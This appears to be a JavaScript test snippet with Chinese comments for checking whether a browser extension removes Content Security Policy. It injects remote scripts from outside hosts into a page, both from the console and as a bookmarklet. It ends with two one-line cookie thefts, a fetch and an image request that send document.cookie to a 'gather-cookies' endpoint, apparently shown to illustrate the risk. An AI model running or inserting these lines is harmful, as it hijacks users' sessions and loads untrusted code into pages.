/*
 *    测试用例
 *
 *   测试步骤
 *   1.  浏览器打开: https://pub.dev/
 *   2.  打开控制台
 *   3.  复制代码到控制台，并且执行
 *   4.  观察执行结果
 *   5.  如果看到报错，说明扩展移除CSP未生效
 *   6. 未报错，并且有输出，成功
 *   7. 也可以新建书签，把代码保存到书签备用
 *
 */

//浏览器控制台执行代码,  检验移除CSP是否生效
(() => {
  let script = document.createElement("script");
  script.setAttribute(
    "src",
    "https://frontend-inject.xiaoshuogeng.com/main.js"
  ),
    script.setAttribute("type", "module"),
    //script.setAttribute("type", "application/javascript"),
    script.setAttribute("charset", "utf-8"),
    document.body.appendChild(script);
})();

//保存为书签使用

javascript: (() => {
  let script = document.createElement("script");
  script.setAttribute(
    "src",
    "https://www.jingjingxyk.com/frontend-experimental-features/main.js"
  ),
    script.setAttribute("type", "application/javascript"),
    script.setAttribute("charset", "utf-8"),
    document.body.appendChild(script);
})();

// 一句话偷窃你的cookie ,怎么解决这个问题呢？

fetch(
  "https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies=" +
    encodeURIComponent(document.cookie)
);

// or

new Image(100, 200).setAttribute(
  "src",
  "https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies=" +
    encodeURIComponent(document.cookie)
);
